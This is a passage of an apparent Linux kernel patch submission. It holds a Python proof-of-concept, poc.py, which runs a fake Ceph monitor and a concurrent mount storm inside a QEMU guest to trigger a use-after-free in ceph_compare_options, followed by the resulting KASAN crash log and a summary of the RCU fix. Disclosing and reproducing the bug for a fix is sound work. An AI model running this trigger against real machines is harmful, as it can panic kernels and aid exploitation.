+                if not self.stop_event.is_set():
+                    self.accept_errors.append(str(exc))
+                return
+
+            worker = ConnWorker(conn, self.stop_event, self.update_interval)
+            self.workers.append(worker)
+            worker.start()
+
+    def stop(self):
+        self.stop_event.set()
+        if self.server is not None:
+            try:
+                self.server.close()
+            except OSError:
+                pass
+        if self.accept_thread is not None:
+            self.accept_thread.join(timeout=1)
+        for worker in self.workers:
+            worker.join(timeout=1)
+
+    def stats(self):
+        subscribed = sum(1 for w in self.workers if w.subscribed)
+        max_epoch = max((w.epoch for w in self.workers), default=0)
+        return {
+            "connections": len(self.workers),
+            "subscribed": subscribed,
+            "max_epoch": max_epoch,
+            "errors": [w.error for w in self.workers if w.error] + self.accept_errors,
+        }
+
+
+class Repro:
+    def __init__(self, ssh_port, monitor_port, workers, duration, attempts, update_interval):
+        self.ssh_port = ssh_port
+        self.monitor_port = monitor_port
+        self.workers = workers
+        self.duration = duration
+        self.attempts = attempts
+        self.update_interval = update_interval
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        repo_root = os.path.abspath(os.path.join(script_dir, "..", "..", "..", ".."))
+        ssh_key = os.environ.get(
+            "QEMU_SSH_KEY",
+            os.path.join(repo_root, "kernel-image", "bullseye.id_rsa"),
+        )
+        self.ssh = [
+            "ssh",
+            "-i",
+            ssh_key,
+            "-o",
+            "StrictHostKeyChecking=no",
+            "-o",
+            "UserKnownHostsFile=/dev/null",
+            "-o",
+            "ConnectTimeout=5",
+            "-p",
+            str(self.ssh_port),
+            "root@localhost",
+        ]
+
+    def ssh_run(self, cmd, timeout=30):
+        return subprocess.run(
+            self.ssh + [cmd],
+            text=True,
+            capture_output=True,
+            timeout=timeout,
+        )
+
+    def ssh_popen(self, cmd):
+        return subprocess.Popen(
+            self.ssh + [cmd],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+        )
+
+    def guest_reachable(self):
+        try:
+            result = self.ssh_run("true", timeout=8)
+        except subprocess.TimeoutExpired:
+            return False
+        return result.returncode == 0
+
+    def cleanup_guest(self):
+        cmd = (
+            "pkill -x mount >/dev/null 2>&1 || true; "
+            "pkill -x timeout >/dev/null 2>&1 || true; "
+            "umount -a -t ceph >/dev/null 2>&1 || true; "
+            "rm -rf /mnt/cephcmp; mkdir -p /mnt/cephcmp; "
+            "dmesg -c >/dev/null 2>&1 || true; "
+            "sysctl -w kernel.panic_on_warn=1 >/dev/null 2>&1 || true"
+        )
+        return self.ssh_run(cmd, timeout=30)
+
+    def mount_source(self):
+        mon = f"10.0.2.2:{self.monitor_port}"
+        return ",".join(mon for _ in range(NUM_MON)) + ":/"
+
+    def mount_opts(self):
+        return "name=admin,ms_mode=legacy,nocephx_sign_messages,mount_timeout=30"
+
+    def storm_cmd(self):
+        source = shlex.quote(self.mount_source())
+        opts = shlex.quote(self.mount_opts())
+        return (
+            "set -eu; "
+            "for i in $(seq 0 " + str(self.workers - 1) + "); do "
+            "mkdir -p /mnt/cephcmp/$i; "
+            "done; "
+            "end=$(( $(date +%s) + " + str(self.duration) + " )); "
+            "for i in $(seq 0 " + str(self.workers - 1) + "); do "
+            "(while [ $(date +%s) -lt $end ]; do "
+            "timeout --signal=TERM --kill-after=1 1 "
+            f"mount -i -t ceph {source} /mnt/cephcmp/$i -o {opts} >/dev/null 2>&1 || true; "
+            "umount -l /mnt/cephcmp/$i >/dev/null 2>&1 || true; "
+            "done) & "
+            "done; "
+            "wait"
+        )
+
+    def collect_dmesg(self):
+        try:
+            result = self.ssh_run("dmesg | tail -n 400", timeout=20)
+        except subprocess.TimeoutExpired as exc:
+            return f"dmesg timeout: {exc}", False
+        return result.stdout + result.stderr, result.returncode == 0
+
+    def run_attempt(self, attempt):
+        cleanup = self.cleanup_guest()
+        if cleanup.returncode != 0:
+            raise RuntimeError(f"guest cleanup failed:\n{cleanup.stdout}\n{cleanup.stderr}")
+
+        monitor = FakeMonitor(self.monitor_port, self.update_interval)
+        monitor.start()
+
+        print(f"[*] attempt {attempt}: starting mount storm with {self.workers} workers", flush=True)
+        storm = self.ssh_popen(self.storm_cmd())
+
+        time.sleep(self.duration + 2)
+
+        monitor.stop()
+
+        try:
+            storm.wait(timeout=10)
+        except subprocess.TimeoutExpired:
+            storm.kill()
+            storm.wait(timeout=5)
+
+        stats = monitor.stats()
+        print(
+            f"[*] attempt {attempt}: connections={stats['connections']} subscribed={stats['subscribed']} max_epoch={stats['max_epoch']}",
+            flush=True,
+        )
+        for err in stats["errors"][:8]:
+            print(f"[i] server error: {err}", flush=True)
+
+        reachable = self.guest_reachable()
+        dmesg, got_dmesg = self.collect_dmesg() if reachable else ("guest unreachable after run", False)
+
+        hit = False
+        if got_dmesg:
+            print(dmesg, flush=True)
+            log = dmesg.lower()
+            hit = (
+                "kasan: slab-use-after-free" in log
+                or "kasan: use-after-free" in log
+                or "ceph_compare_options" in log
+                or "ceph_monmap_contains" in log
+                or "kernel panic - not syncing" in log
+            )
+        elif not reachable and stats["subscribed"] > 0 and stats["max_epoch"] > 10:
+            hit = True
+            print("[+] guest became unreachable after repeated monmap churn", flush=True)
+
+        self.cleanup_guest()
+        return hit
+
+    def run(self):
+        for attempt in range(1, self.attempts + 1):
+            if self.run_attempt(attempt):
+                return 0
+        return 1
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Trigger ceph_compare_options UAF with a fake monitor")
+    parser.add_argument("--ssh-port", type=int, required=True, help="QEMU SSH port")
+    parser.add_argument("--monitor-port", type=int, default=6789, help="Host fake monitor port")
+    parser.add_argument("--workers", type=int, default=16, help="Concurrent guest mount workers")
+    parser.add_argument("--duration", type=int, default=5, help="Per-attempt runtime in seconds")
+    parser.add_argument("--attempts", type=int, default=10, help="Number of attempts")
+    parser.add_argument(
+        "--update-interval",
+        type=float,
+        default=0.0005,
+        help="Seconds between monmap updates per subscribed client",
+    )
+    args = parser.parse_args()
+
+    repro = Repro(
+        ssh_port=args.ssh_port,
+        monitor_port=args.monitor_port,
+        workers=args.workers,
+        duration=args.duration,
+        attempts=args.attempts,
+        update_interval=args.update_interval,
+    )
+    return repro.run()
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
+------END poc.py--------
+
+----BEGIN crash log----
+
+[  227.669089][ T9575] libceph: mon8 (1)10.0.2.2:6789 session established
+[  227.953134][   T26] libceph: mon30 (1)10.0.2.2:6789 session established
+[  227.978738][T10215] ==================================================================
+[  227.979344][T10215] BUG: KASAN: slab-use-after-free in ceph_monmap_contains+0x1e4/0x220
+[  227.980082][T10215] Read of size 4 at addr ffff888045132014 by task mount/10215
+[  227.980588][T10215]
+[  227.980818][T10215] CPU: 0 UID: 0 PID: 10215 Comm: mount Not tainted 6.12.74 #1
+[  227.980859][T10215] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  227.980884][T10215] Call Trace:
+[  227.980901][T10215]  <TASK>
+[  227.980911][T10215]  dump_stack_lvl+0x10e/0x1f0
+[  227.981009][T10215]  print_report+0xc6/0x620
+[  227.981338][T10215]  kasan_report+0xd8/0x110
+[  227.981423][T10215]  ceph_monmap_contains+0x1e4/0x220
+[  227.981474][T10215]  ceph_compare_options+0x591/0x700
+[  227.981589][T10215]  ceph_compare_super+0x487/0xba0
+[  227.981699][T10215]  sget_fc+0x51e/0xc10
+[  227.982181][T10215]  ceph_get_tree+0x6e7/0x1e20
+[  227.982379][T10215]  path_mount+0x6cc/0x1fd0
+[  227.982639][T10215]  __x64_sys_mount+0x294/0x320
+[  227.982738][T10215]  do_syscall_64+0xc7/0x250
+[  227.982811][T10215]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  227.983093][T10215]  </TASK>
+[  228.003473][T10215] Allocated by task 9575:
+[  228.005659][T10215]  mon_dispatch+0x1906/0x2630
+[  228.006129][T10215]  ceph_con_process_message+0x208/0x640
+[  228.007264][T10215]  ceph_con_workfn+0x95a/0x11e0
+[  228.009862][T10215]
+[  228.010065][T10215] Freed by task 9575:
+[  228.012555][T10215]  mon_dispatch+0x1aa4/0x2630
+[  228.013032][T10215]  ceph_con_process_message+0x208/0x640
+[  228.014011][T10215]  ceph_con_workfn+0x95a/0x11e0
+[  228.016401][T10215]
+[  228.041334][T10215] Memory state around the buggy address:
+[  228.043135][T10215] >ffff888045132000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  228.045551][T10215] ==================================================================
+[  228.046391][T10215] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  228.052925][T10215]  check_panic_on_warn+0xab/0xb0
+[  228.054125][T10215]  ceph_monmap_contains+0x1e4/0x220
+[  228.055063][T10215]  ceph_compare_options+0x591/0x700
+[  228.055976][T10215]  ceph_compare_super+0x487/0xba0
+[  228.056930][T10215]  sget_fc+0x51e/0xc10
+[  228.058710][T10215]  ceph_get_tree+0x6e7/0x1e20
+[  228.060624][T10215]  path_mount+0x6cc/0x1fd0
+[  228.063231][T10215]  __x64_sys_mount+0x294/0x320
+[  228.064118][T10215]  do_syscall_64+0xc7/0x250
+[  228.064528][T10215]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  228.071561][T10215] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Yong Wang
+
+Yong Wang (1):
+  libceph: use RCU to protect monmap in ceph_compare_options()
+
+ fs/ceph/super.c                 |  7 +++--
+ include/linux/ceph/mon_client.h |  4 ++-
+ net/ceph/ceph_common.c          | 21 ++++++++++----
+ net/ceph/debugfs.c              | 11 ++++---
+ net/ceph/mon_client.c           | 51 ++++++++++++++++++++++-----------
+ 5 files changed, 65 insertions(+), 29 deletions(-)
+
+-- 
+2.53.0
+
